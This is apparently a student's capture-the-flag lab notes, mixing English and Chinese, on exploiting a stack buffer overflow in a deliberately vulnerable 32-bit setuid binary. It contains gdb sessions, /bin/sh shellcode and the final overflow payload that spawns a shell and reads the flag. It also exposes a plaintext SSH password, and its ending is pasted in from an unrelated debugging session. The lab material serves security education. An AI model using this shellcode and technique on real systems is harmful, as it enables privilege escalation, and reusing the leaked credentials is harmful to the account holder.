@@ -1,0 +1,522 @@
+Goal and instructions
+Connect to bin.chall.necst.it port 22 via SSH as user m918111. You will find the files in /home/m918111/mission0.
+Your goal is to read the file flag with the privileges of the group that owns the vulnerable binary.
+The executable program is compiled with: gcc -m32 -no-pie -fno-stack-protector -z execstack -o mission0 mission0.c
+
+-m32 的意思是生成 32 位的程序， -no-pie 的意思是关闭 PIE(ASLR) 保护， -z execstack 的意思是关闭不可执行保护。
+
+Password for user m918111 has been reset. This is your new password: 1bY0fYYMIfFW0wC. Please take note of it.
+
+zzz590324857
+
+>>> ssh m918111@bin.chall.necst.it -p 22 
+Connection to 131.175.14.151 port 22
+——————————--------------------------------------------------------
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+ ____                       _ _
+/ ___|  ___  ___ _   _ _ __(_) |_ _   _
+\___ \ / _ \/ __| | | | '__| | __| | | |
+ ___) |  __/ (__| |_| | |  | | |_| |_| |
+|____/ \___|\___|\__,_|_|  |_|\__|\__, |
+                                  |___/
+  ____ _           _ _
+ / ___| |__   __ _| | | ___ _ __   __ _  ___  ___
+| |   | '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \/ __|
+| |___| | | | (_| | | |  __/ | | | (_| |  __/\__ \
+ \____|_| |_|\__,_|_|_|\___|_| |_|\__, |\___||___/
+                                  |___/
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+————————————————————--------------------------------------------------------
+
+mission0.c
+#include <stdio.h>
+#include <string.h>
+
+
+int vuln(char* str){
+
+        char buf[208];
+        printf("%s", str);
+        strcpy(buf, str);
+        return 0;
+}
+
+int main(int argc, char **argv){
+        if (argc < 2){
+                printf("missing parameters...");
+                return -1;
+        }
+        vuln(argv[1]);
+        return 0;       
+}
+——————————————————————————--------------------------------------------------------
+
+>>> cd /home/m918111/mission0
+>>> ls - l
+total 20
+-r--r----- 1 root    lev0      20 May  4 02:22 flag
+-r-xr-sr-x 1 nobody  lev0    7412 May  4 02:22 mission0
+-rw-r--r-- 1 m918111 m918111  355 May  4 02:22 mission0.c
+drwxr-xr-x 2 m918111 root    4096 May  4 02:22 writable
+
+>>> cat flag
+cat: flag: Permission denied
+
+>>> gdb mission0
+>>> disassemble main
+Dump of assembler code for function main:
+   0x08048473 <+0>:	lea    ecx,[esp+0x4]
+   0x08048477 <+4>:	and    esp,0xfffffff0
+   0x0804847a <+7>:	push   DWORD PTR [ecx-0x4]
+   0x0804847d <+10>:	push   ebp
+   0x0804847e <+11>:	mov    ebp,esp
+   0x08048480 <+13>:	push   ecx
+   0x08048481 <+14>:	sub    esp,0x4
+   0x08048484 <+17>:	mov    eax,ecx
+   0x08048486 <+19>:	cmp    DWORD PTR [eax],0x1
+   0x08048489 <+22>:	jg     0x80484a2 <main+47>
+   0x0804848b <+24>:	sub    esp,0xc
+   0x0804848e <+27>:	push   0x8048553
+   0x08048493 <+32>:	call   0x8048300 <printf@plt>
+   0x08048498 <+37>:	add    esp,0x10
+   0x0804849b <+40>:	mov    eax,0xffffffff
+   0x080484a0 <+45>:	jmp    0x80484bb <main+72>
+   0x080484a2 <+47>:	mov    eax,DWORD PTR [eax+0x4]
+   0x080484a5 <+50>:	add    eax,0x4
+   0x080484a8 <+53>:	mov    eax,DWORD PTR [eax]
+   0x080484aa <+55>:	sub    esp,0xc
+   0x080484ad <+58>:	push   eax
+   0x080484ae <+59>:	call   0x804843b <vuln>
+   0x080484b3 <+64>:	add    esp,0x10
+   0x080484b6 <+67>:	mov    eax,0x0
+   0x080484bb <+72>:	mov    ecx,DWORD PTR [ebp-0x4]
+   0x080484be <+75>:	leave
+   0x080484bf <+76>:	lea    esp,[ecx-0x4]
+   0x080484c2 <+79>:	ret
+End of assembler dump.
+>>>disassemble vuln
+Dump of assembler code for function vuln:
+   0x0804843b <+0>:	push   ebp
+   0x0804843c <+1>:	mov    ebp,esp
+   0x0804843e <+3>:	sub    esp,0xd8    # !!! 申请 0xd8空间 即216 位+++++++++++++++++++++++++++++
+   0x08048444 <+9>:	sub    esp,0x8     #++++++++++++++++++8
+   0x08048447 <+12>:	push   DWORD PTR [ebp+0x8]
+   0x0804844a <+15>:	push   0x8048550
+   0x0804844f <+20>:	call   0x8048300 <printf@plt>
+   0x08048454 <+25>:	add    esp,0x10
+   0x08048457 <+28>:	sub    esp,0x8
+   0x0804845a <+31>:	push   DWORD PTR [ebp+0x8]
+   0x0804845d <+34>:	lea    eax,[ebp-0xd8]
+   0x08048463 <+40>:	push   eax
+   0x08048464 <+41>:	call   0x8048310 <strcpy@plt>
+   0x08048469 <+46>:	add    esp,0x10
+   0x0804846c <+49>:	mov    eax,0x0
+   0x08048471 <+54>:	leave
+   0x08048472 <+55>:	ret
+End of assembler dump.
+——————————————————
+>>>break main #设置断点运行
+Breakpoint 1 at 0x8048481
+
+>>>break vuln
+Breakpoint 2 at 0x8048444
+
+——————————————————
+To avoid manually counting the number of characters we pass to ex2 we can use a perl command 
+to write how many ’A’s we want just specifying their number: In perl, our address becomes the 
+string ”\x7b\x84\x04\x08” that we will attach at the end of 128 ’A’s using the string concatenation operator ’ . ’ 
+
+>>> ./mission0 $(perl -e ‘print “A”x20. “\x7b\x84\x04\x08” ’)             #A==0x41
+
+>>> run $(perl -e 'print "A"x20') #运行with input
+Starting program: /home/m918111/mission0/mission0 $(perl -e 'print "A"x20')
+
+Breakpoint 1, 0x08048481 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ EAX  0xf7fc9dbc (environ) —▸ 0xffffc620 —▸ 0xffffc794 ◂— 'XDG_SESSION_ID=c1106'
+ EBX  0x0
+ ECX  0xffffc580 ◂— 0x2
+ EDX  0xffffc5a4 ◂— 0x0
+ EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0xffffc568 ◂— 0x0
+ ESP  0xffffc564 —▸ 0xffffc580 ◂— 0x2
+ EIP  0x8048481 (main+14) ◂— sub    esp, 4
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x8048481 <main+14>    sub    esp, 4
+   0x8048484 <main+17>    mov    eax, ecx
+   0x8048486 <main+19>    cmp    dword ptr [eax], 1
+   0x8048489 <main+22>    jg     main+47 <0x80484a2>
+    ↓
+   0x80484a2 <main+47>    mov    eax, dword ptr [eax + 4]
+   0x80484a5 <main+50>    add    eax, 4
+   0x80484a8 <main+53>    mov    eax, dword ptr [eax]
+   0x80484aa <main+55>    sub    esp, 0xc
+   0x80484ad <main+58>    push   eax
+   0x80484ae <main+59>    call   vuln <0x804843b>
+
+   0x80484b3 <main+64>    add    esp, 0x10
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xffffc564 —▸ 0xffffc580 ◂— 0x2
+01:0004│ ebp  0xffffc568 ◂— 0x0
+02:0008│      0xffffc56c —▸ 0xf7e2e637 (__libc_start_main+247) ◂— add    esp, 0x10
+03:000c│      0xffffc570 —▸ 0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+... ↓
+05:0014│      0xffffc578 ◂— 0x0
+06:0018│      0xffffc57c —▸ 0xf7e2e637 (__libc_start_main+247) ◂— add    esp, 0x10
+07:001c│ ecx  0xffffc580 ◂— 0x2
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► f 0  8048481 main+14
+   f 1 f7e2e637 __libc_start_main+247
+Breakpoint main
+
+>>> continue #运行完
+Continuing.
+
+Breakpoint 2, 0x08048444 in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ EAX  0xffffc77f ◂— 'AAAAAAAAAAAAAAAAAAAA'
+ EBX  0x0
+ ECX  0xffffc580 ◂— 0x2
+ EDX  0xffffc5a4 ◂— 0x0
+ EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0xffffc548 —▸ 0xffffc568 ◂— 0x0
+ ESP  0xffffc470 —▸ 0xf7ff5c44 ◂— jae    0xf7ff5cbf /* 'symbol=%s;  lookup in file=%s [%lu]\n' */
+ EIP  0x8048444 (vuln+9) ◂— sub    esp, 8
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x8048444 <vuln+9>     sub    esp, 8
+   0x8048447 <vuln+12>    push   dword ptr [ebp + 8]
+   0x804844a <vuln+15>    push   0x8048550
+   0x804844f <vuln+20>    call   printf@plt <0x8048300>
+
+   0x8048454 <vuln+25>    add    esp, 0x10
+   0x8048457 <vuln+28>    sub    esp, 8
+   0x804845a <vuln+31>    push   dword ptr [ebp + 8]
+   0x804845d <vuln+34>    lea    eax, [ebp - 0xd8]
+   0x8048463 <vuln+40>    push   eax
+   0x8048464 <vuln+41>    call   strcpy@plt <0x8048310>
+
+   0x8048469 <vuln+46>    add    esp, 0x10
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xffffc470 —▸ 0xf7ff5c44 ◂— jae    0xf7ff5cbf /* 'symbol=%s;  lookup in file=%s [%lu]\n' */
+01:0004│      0xffffc474 —▸ 0xffffc520 ◂— 0xffffffff
+02:0008│      0xffffc478 —▸ 0xf7ff3b73 ◂— cmp    al, 0x6d /* '<main program>' */
+03:000c│      0xffffc47c —▸ 0xf7fd5470 —▸ 0xf7ffd918 ◂— 0
+04:0010│      0xffffc480 ◂— 0x0
+... ↓
+06:0018│      0xffffc488 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— inc    eax /* 0x23f40 */
+07:001c│      0xffffc48c —▸ 0xf7ffdc08 —▸ 0xf7fd8000 ◂— jg     0xf7fd8047
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► f 0  8048444 vuln+9
+   f 1  80484b3 main+64
+   f 2 f7e2e637 __libc_start_main+247
+Breakpoint vuln
+
+>>> nexti #继续下一步
+#直到vuln中strcopy刚执行完的一步 check $ebp +4
+
+x08048469 in vuln ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ EAX  0xffffc470 ◂— 'AAAAAAAAAAAAAAAAAAAA'
+ EBX  0x0
+ ECX  0xffffc790 ◂— 0x414141 /* 'AAA' */
+ EDX  0xffffc481 ◂— 0x414141 /* 'AAA' */
+ EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0xffffc548 —▸ 0xffffc568 ◂— 0x0
+ ESP  0xffffc460 —▸ 0xffffc470 ◂— 'AAAAAAAAAAAAAAAAAAAA'
+ EIP  0x8048469 (vuln+46) ◂— add    esp, 0x10
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   0x8048457 <vuln+28>    sub    esp, 8
+   0x804845a <vuln+31>    push   dword ptr [ebp + 8]
+   0x804845d <vuln+34>    lea    eax, [ebp - 0xd8]
+   0x8048463 <vuln+40>    push   eax
+   0x8048464 <vuln+41>    call   strcpy@plt <0x8048310>
+
+ ► 0x8048469 <vuln+46>    add    esp, 0x10
+   0x804846c <vuln+49>    mov    eax, 0
+   0x8048471 <vuln+54>    leave
+   0x8048472 <vuln+55>    ret
+    ↓
+   0x80484b3 <main+64>    add    esp, 0x10
+   0x80484b6 <main+67>    mov    eax, 0
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xffffc460 —▸ 0xffffc470 ◂— 'AAAAAAAAAAAAAAAAAAAA'
+01:0004│      0xffffc464 —▸ 0xffffc77f ◂— 'AAAAAAAAAAAAAAAAAAAA'
+02:0008│      0xffffc468 —▸ 0xf7e22dc8 ◂— jbe    0xf7e22df5 /* 'v+' */
+03:000c│      0xffffc46c ◂— 0x7b1ea71
+04:0010│ eax  0xffffc470 ◂— 'AAAAAAAAAAAAAAAAAAAA'
+... ↓
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► f 0  8048469 vuln+46
+   f 1  80484b3 main+64
+   f 2 f7e2e637 __libc_start_main+247
+
+>>>info registers #查看寄存器情况
+eax            0xffffc470	-15248
+ecx            0xffffc790	-14448
+edx            0xffffc481	-15231
+ebx            0x0	0
+esp            0xffffc460	0xffffc460  #！！！
+ebp            0xffffc548	0xffffc548  #!!!!
+esi            0xf7fc8000	-134447104
+edi            0xf7fc8000	-134447104
+eip            0x8048469	0x8048469 <vuln+46>
+eflags         0x202	[ IF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+
+
+The return address of function is at $ebp +4
+# $ebp +4 - $esp = 0xffffc548 +4 - 0xffffc460 = EC=236
+
+>>>delete 1 #删除第一个breakpoint
+
+==============================================================================
+>>>run $(perl -e 'print "A"x216')
+Starting program: /home/m918111/mission0/mission0 $(perl -e 'print "A"x216')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x080484c2 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ EAX  0x0
+ EBX  0x0
+ ECX  0x41414141 ('AAAA')
+ EDX  0xffffc485 ◂— 0x414141 /* 'AAA' */
+ EDI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ ESI  0xf7fc8000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
+ EBP  0x41414141 ('AAAA')
+ ESP  0x4141413d ('=AAA')
+ EIP  0x80484c2 (main+79) ◂— ret
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   0x80484b3 <main+64>    add    esp, 0x10
+   0x80484b6 <main+67>    mov    eax, 0
+   0x80484bb <main+72>    mov    ecx, dword ptr [ebp - 4]
+   0x80484be <main+75>    leave
+   0x80484bf <main+76>    lea    esp, [ecx - 4]
+ ► 0x80484c2 <main+79>    ret  #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+   0x80484c3              nop
+   0x80484c5              nop
+   0x80484c7              nop
+   0x80484c9              nop
+   0x80484cb              nop
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+<Could not read memory at 0x4141413d>
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+ ► f 0  80484c2 main+79
+Program received signal SIGSEGV (fault address 0x4141413d)
+
+>>>
+216
+
+$SHELLCODE = \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59
+
+>>>r $(perl -e 'print "AAAA" . "\x90"x153 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59" . "\x90"x4')
+
+Continuing.
+AAAA��������������������������������������������������������������������������������������������������������������������������������������������������������1��F1�1�̀�[1��C��C
+                                                                                                                                                                             �
+                                                                                                                                                                              ��S
+                                                                                                                                                                                  ̀�����/bin/shNXXXXYYYY����[Inferior 1 (process 24703) exited normally]
+
+这段代码可以获得root权限--》变成shellcode
+#include <stdio.h>  
+int main(){  
+setuid(0);  
+execve("/bin/sh",NULL,NULL);  
+} 
+对应的汇编代码为：
+global _start
+ 
+_start:
+ 
+xor rdi,rdi
+xor rax,rax
+mov al,0x69
+syscall
+ 
+xor rdx, rdx
+mov rbx, 0x68732f6e69622fff
+shr rbx, 0x8
+push rbx
+mov rdi, rsp
+xor rax, rax
+push rax
+push rdi
+mov rsi, rsp
+mov al, 0x3b
+syscall
+
+#SHELLCODE
+
+>>> nasm -f elf shellcode.asm #我们新建一个 shellcode.asm 文件并插入上面的示例 shellcode。这段汇编代码使用的是 nasm。
+----> shellcode.o
+>>>objdump -d -M intel shellcode.o  然后我们可以使用 objdump 来解读这个文件，得到 shellcode 的字节码。
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+>>> r $(perl -e 'print "\x90"x179 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "EEEE"x5 ')    # 216 +8
+我们在 gdb 中使用 x/100x $sp-100 来查看从当前堆栈地址前 100 个内存长度位置开始的 100 个内存长度的内存内容。
+
+>>>x/100x $esp-300 
+ #关于 gdb 查看内存的命令：
+x/<n/f/u> <addr>
+n 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个内存地址的内容。
+f 标示现实的格式
+参数 f 的可选值：
+x 按十六进制格式显示变量。
+d 按十进制格式显示变量。
+u 按十六进制格式显示无符号整型。
+o 按八进制格式显示变量。
+t 按二进制格式显示变量。
+a 按十六进制格式显示变量。
+c 按字符格式显示变量。
+f 按浮点数格式显示变量。
+u 表示将多少个字节作为一个值提取出来，如果不指定的话，gdb 默认是 4 个 bytes。当我们指定了字节长度后，gdb 会从内存定的地址开始，读取制定字节，并把它当作一个值提取出来。
+参数 u 的可选值：
+b 表示单字节
+H 表示双字节
+W 表示四字节
+G 表示八字节
+
+0xffffc364:	0xf7e1a598	0xf7e580cb	0x00000000	0xf7fe77eb
+0xffffc374:	0x00000000	0xf7fc8000	0xf7fc8000	0xffffc488
+0xffffc384:	0xf7fee010	0xf7fc9870	0xf7e9ce10	0xffffc3b0
+0xffffc394:	0x00000000	0xf7fc8000	0x08048469	0xffffc3b0
+
+0xffffc3a4:	0xffffc6b3	0xf7e22dc8	0x07b1ea71	0x41414141
+0xffffc3b4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc3c4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc3d4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc3e4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc3f4:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc404:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc414:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc424:	0x41414141	0x41414141	0x41414141	0x41414141
+
+0xffffc434:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc444:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffc454:	0x41414141	0x41414141	0x41414141	0x31414141
+0xffffc464:	0x2f6850c0	0x6868732f	0x6e69622f	0x8950e389
+0xffffc474:	0xe18953e2	0x80cd0bb0	0x45454545	0x45454545
+0xffffc484:	0x45454545	0x45454545	0x45454545	0xffffc600
+
+0xffffc494:	0xffffc554	0xffffc560	0x080484f1	0xf7fc83dc
+0xffffc4a4:	0xffffc4c0	0x00000000	0xf7e2e637	0xf7fc8000
+0xffffc4b4:	0xf7fc8000	0x00000000	0xf7e2e637	0x00000002
+0xffffc4c4:	0xffffc554	0xffffc560	0x00000000	0x00000000
+0xffffc4d4:	0x00000000	0xf7fc8000	0xf7ffdc04	0xf7ffd000
+0xffffc4e4:	0x00000000	0xf7fc8000	0xf7fc8000	0x00000000
+
+更改返回地址 0xffffc434 ====> 0x34c4ffff
+>>>r $(perl -e 'print "\x90"x179 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x34\xc4\xff\xff"x5 ')
+
+r $(perl -e 'print "\x90"x179 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x34\xc4\xff\xff"x5 ')
+Starting program: /home/m918111/mission0/mission0 $(perl -e 'print "\x90"x179 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" . "\x34\xc4\xff\xff"x5 ')
+process 32739 is executing new program: /bin/dash
+$
+
+发现出错原因： 返回地址ebp eip所在空间大小不止216 216+8
+
+r $(perl -e 'print "AAAA" . "\x90"x149 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59" . "EEEE"x5')
+pwndbg> x/100x $esp-300
+0xffffc354:	0xf7e1a598	0xf7e580cb	0x00000000	0xf7fe77eb
+0xffffc364:	0x00000000	0xf7fc8000	0xf7fc8000	0xffffc478
+0xffffc374:	0xf7fee010	0xf7fc9870	0xf7e9ce10	0xffffc3a0
+0xffffc384:	0x00000000	0xf7fc8000	0x08048469	0xffffc3a0
+0xffffc394:	0xffffc6af	0xf7e22dc8	0x07b1ea71	0x41414141
+0xffffc3a4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc3b4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc3c4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc3d4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc3e4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc3f4:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc404:	0x90909090	0x90909090	0x90909090	0x90909090
+
+0xffffc414:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc424:	0x90909090	0x90909090	0x90909090	0x90909090
+0xffffc434:	0x90909090	0xb0c03190	0x31db3146	0xeb80cdc9
+0xffffc444:	0xc0315b16	0x89074388	0x4389085b	0x8d0bb00c
+0xffffc454:	0x538d084b	0xe880cd0c	0xffffffe5	0x6e69622f
+0xffffc464:	0x4e68732f	0x58585858	0x59595959	0x45454545
+0xffffc474:	0x45454545	0x45454545	0x45454545	0x45454545
+0xffffc484:	0xffffc500	0xffffc550	0x080484f1	0xf7fc83dc
+0xffffc494:	0xffffc4b0	0x00000000	0xf7e2e637	0xf7fc8000
+0xffffc4a4:	0xf7fc8000	0x00000000	0xf7e2e637	0x00000002
+0xffffc4b4:	0xffffc544	0xffffc550	0x00000000	0x00000000
+0xffffc4c4:	0x00000000	0xf7fc8000	0xf7ffdc04	0xf7ffd000
+0xffffc4d4:	0x00000000	0xf7fc8000	0xf7fc8000	0x00000000
+>>>r $(perl -e 'print "AAAA" . "\x90"x149 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59" . "\x14\xc4\xff\xff"x5')
+
+
+m918111@bin:~/mission0$ ./mission0 $(perl -e 'print "AAAA" . "\x90"x149 . "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x58\x58\x58\x58\x59\x59\x59\x59" . "\x14\xc4\xff\xff"x5')
+$ whoami
+m918111
+$ ls
+flag  mission0	mission0.c  writable
+$ cat flag
+MuVTAVSJIYKWAITYPpch
+
+
+6	    gets(buf);
+(gdb) info registers [查看寄存器信息，[十六进制，十进制/翻译，说明]]
+eax            0x1	1  [累加器]
+ecx            0x52987f86	1385725830  [计数器]
+edx            0xbffff704	-1073744124  [数据]
+ebx            0x80481a8	     134513064  [基址，ebp]
+esp            0xbffff610	0xbffff610  [栈指针]
+ebp            0xbffff6b8	0xbffff6b8  [基址指针]
+esi            0x0	0  [源索引]
+edi            0x80eb00c	135180300  [目标索引]
+eip            0x8048e4d	0x8048e4d <read_req+9>  [指令指针]
+eflags         0x28 [ SF IF ] [标志寄存器，符号标记，中断允许标记]
+cs             0x73	115  [代码段]
+ss             0x7b	123  [堆栈段]
+ds             0x7b	123  [数据段]
+es             0x7b	123  [附加段]
+fs             0x0	0    [无明确定义，字母表中f在e之后]
+gs             0x33	51   [无明确定义, g在f之后]
+
+
+(gdb) disass read_req   [反汇编，AT&T风格]
+Dump of assembler code for function read_req:
+   0x08048e44 <+0>:	push   %ebp   [将旧%ebp入栈*]
+   0x08048e45 <+1>:	mov    %esp,%ebp [用%esp来设定新%ebp]
+   0x08048e47 <+3>:	sub    $0xa8,%esp [栈增长，留出局部变量空间*]
+=> 0x08048e4d <+9>:	lea    -0x8c(%ebp),%eax [将&buf[0]地址…*]
+   0x08048e53 <+15>: mov    %eax,(%esp) [移入栈顶，向gets传递参数]
+   0x08048e56 <+18>: call   0x804fc90 <gets> [将%eip入栈并调用]
+   0x08048e5b <+23>: lea    -0x8c(%ebp),%eax [将&buf[0]地址]
+   0x08048e61 <+29>: mov    %eax,(%esp)   [移入栈顶，传递参数]
+   0x08048e64 <+32>: call   0x804dd10 <atoi>
+   0x08048e69 <+37>: mov    %eax,-0xc(%ebp) [将atoi结果写入i]
+   0x08048e6c <+40>: mov    -0xc(%ebp),%eax [将i写入函数返回值]
+   0x08048e6f <+43>: leave [弹出整个栈帧*]
+   0x08048e70 <+44>: ret [弹出栈中%eip，并跳转执行]
+End of assembler dump.
+
+
